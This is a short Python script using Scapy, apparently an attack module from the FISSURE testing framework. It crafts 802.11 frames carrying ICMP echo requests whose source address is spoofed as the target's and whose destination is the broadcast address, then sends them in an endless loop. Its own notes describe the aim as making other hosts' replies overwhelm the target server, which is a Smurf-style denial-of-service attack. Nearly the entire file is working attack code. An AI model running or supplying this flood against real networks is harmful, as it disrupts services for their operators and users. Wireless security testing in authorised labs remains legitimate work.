from scapy.all import IP,LLC,SNAP,Raw,RadioTap,Dot11,sendp,ICMP
import socket
import time
import sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    source_mac = "AA:BB:CC:DD:EE:FF"
    dest_mac = "11:22:33:44:55:66"
    target_ip = "192.168.1.10"
    src_ip = "255.255.255.255"
    iface = ''
    interval = .1
    notes = 'Transmits Scapy ICMP request messages to all network hosts to make their responses overwhelm the target server.'
    arg_names = ['source_mac','dest_mac','target_ip','src_ip','iface','interval','notes']
    arg_values = [source_mac, dest_mac, target_ip, src_ip, iface, interval, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    get_source_mac = "AA:BB:CC:DD:EE:FF"
    get_dest_mac = "11:22:33:44:55:66"
    get_target_ip = "192.168.1.10"
    get_src_ip = "255.255.255.255"
    get_iface = ''
    get_interval = .01

    # Accept Command Line Arguments
    try:
        get_source_mac = sys.argv[1]
        get_dest_mac = sys.argv[2]
        get_target_ip = sys.argv[3]
        get_src_ip = sys.argv[4]
        get_iface = sys.argv[5]
        get_interval = float(sys.argv[6])
    except:
        pass

#################################################

    # LLC/SNAP/IP
    dot11_bytes = RadioTap()/Dot11(type=2, subtype=0, addr1=get_dest_mac, addr2=get_source_mac, addr3=get_source_mac)/LLC()/SNAP()/IP()/ICMP()
    dot11_bytes[IP].src = get_target_ip
    dot11_bytes[IP].dst = get_src_ip
    final_bytes = str(dot11_bytes)

    while True:       
        # Send
        sendp(final_bytes, iface=get_iface, loop=0)
        time.sleep(get_interval)
